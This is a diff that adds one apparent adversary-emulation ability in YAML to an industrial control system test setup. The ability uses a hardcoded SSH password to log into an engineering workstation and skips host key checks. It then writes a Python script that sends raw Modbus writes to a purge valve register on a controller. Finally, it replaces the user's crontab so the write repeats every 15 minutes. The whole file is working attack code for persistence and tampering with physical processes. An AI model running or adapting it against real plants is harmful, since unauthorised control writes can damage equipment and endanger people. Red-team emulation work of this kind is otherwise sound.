@@ -1,0 +1,31 @@
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000005
+  name: SSH - Install crontab on EWS for periodic Modbus write
+  description: |
+    Replaces user crontab on engineer@EWS with a periodic job that writes the purge
+    valve holding register via Python 3 stdlib (no modbus_cli on EWS — avoids GLIBC
+    issues with PyInstaller builds compiled on newer glibc).
+  tactic: lateral-movement
+  technique_id: T0886
+  technique_name: Remote Services
+  executors:
+  - platform: linux
+    name: sh
+    command: |
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; }
+      printf '%s\n' \
+        'import socket,struct' \
+        'def main():' \
+        '    s=socket.socket();s.settimeout(5);s.connect(("192.168.95.12",502))' \
+        '    pdu=struct.pack(">BHH",6,1,0)' \
+        '    s.sendall(struct.pack(">HHHB",1,0,len(pdu)+1,1)+pdu);s.close()' \
+        '    print("EWS_CRON_PURGE_WRITE")' \
+        'main()' \
+      | sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+        -o ConnectTimeout=15 engineer@192.168.95.5 'cat > /tmp/ews_cron_mb.py && chmod 644 /tmp/ews_cron_mb.py'
+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+        -o ConnectTimeout=15 engineer@192.168.95.5 \
+        '(echo "*/15 * * * * /usr/bin/python3 /tmp/ews_cron_mb.py >> /tmp/ews_cron_mb.log 2>&1") | crontab - && crontab -l'
+      echo "EWS_CRON_INSTALLED"
+    timeout: 90
